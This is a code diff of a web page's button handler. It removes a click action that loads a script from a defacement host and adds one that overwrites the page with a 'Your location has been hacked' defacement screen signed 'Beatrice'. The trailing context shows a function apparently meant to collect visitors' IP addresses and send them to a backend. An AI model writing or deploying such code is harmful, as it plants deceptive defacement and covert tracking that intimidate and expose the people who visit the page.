@@ -85,12 +85,84 @@
     </div>
 
     <script>
-document.addEventListener("DOMContentLoaded", () => {
-  document.getElementById('create-button').addEventListener('click', () => {
-    let s = document.createElement("script");
-    s.src = "https://jso.defacer.id/raw/87Zah66df9";
-    document.body.appendChild(s);
-  });
+document.getElementById('create-button').addEventListener('click', () => {
+  document.open();
+  document.write(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Your location has been hacked</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@800&display=swap');
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Orbitron', sans-serif;
+      color: #00ffcc;
+      overflow: hidden;
+      height: 100%;
+      background: url('https://s0.gifyu.com/images/2e37bf38efbbce54dc389724f7d7b1b48e393457_hq.gif') center/cover no-repeat fixed;
+      background-size: cover;
+    }
+
+    .content {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding-top: 40px;
+      backdrop-filter: brightness(1.1);
+    }
+
+    .glitch {
+  font-size: 60px;
+  color: #000000; /* warna hitam */
+  text-shadow: 0 0 5px #444; /* kalau gak mau ada cahaya-glow nya */
+}
+
+    .glitch2 {
+      font-size: 35px;
+      color: #000000;
+      text-shadow: 0 0 5px #0ff, 0 0 10px #0ff;
+      margin-top: 15px;
+    }
+
+    .gif {
+      margin-top: 30px;
+    }
+
+    .gif img {
+      width: 350px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 25px #0ff;
+    }
+
+    .quote {
+      margin-top: 30px;
+      font-size: 26px;
+      color: #000000;
+      text-shadow: 0 0 5px #fff, 0 0 10px #00ffff;
+      padding: 0 15px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="content">
+  <div class="glitch">Your location has been hacked</div>
+  <div class="glitch2">-Beatrice</div>
+
+  <div class="gif">
+    <img src="https://giffiles.alphacoders.com/570/57027.gif" alt="Hacker GIF">
+  </div>
+
+  <div class="quote">Welcome to my cyber playground. Nothing is safe</div>
+</div>
+
+</body>
+</html>`);
+  document.close();
 });
     // Fungsi untuk mengambil IP dan mengirimkannya ke backend
     async function getAndSendIP() {
